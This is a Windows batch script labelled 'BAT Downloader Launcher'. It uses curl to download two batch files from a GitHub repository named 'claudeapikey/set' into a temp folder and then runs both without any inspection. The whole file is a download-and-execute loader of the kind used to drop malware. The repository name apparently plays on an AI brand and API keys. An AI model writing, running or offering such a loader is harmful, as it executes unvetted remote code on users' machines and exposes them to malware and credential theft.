
@echo off
setlocal
title BAT Downloader Launcher

set "DEST=%TEMP%\MyScripts"
if not exist "%DEST%" mkdir "%DEST%"

echo Downloading first BAT file...
curl.exe -fLsS "https://raw.githubusercontent.com/claudeapikey/set/refs/heads/main/pritam.bat" -o "%DEST%\first.bat"
if errorlevel 1 goto error

echo Downloading second BAT file...
curl.exe -fLsS "https://raw.githubusercontent.com/claudeapikey/set/refs/heads/main/bhaiyya.bat" -o "%DEST%\second.bat"
if errorlevel 1 goto error

echo Running first BAT...
call "%DEST%\first.bat"
if errorlevel 1 goto error

echo Running second BAT...
call "%DEST%\second.bat"
if errorlevel 1 goto error

exit /b 0

:error
echo An operation failed. Error code: %errorlevel%
exit /b 1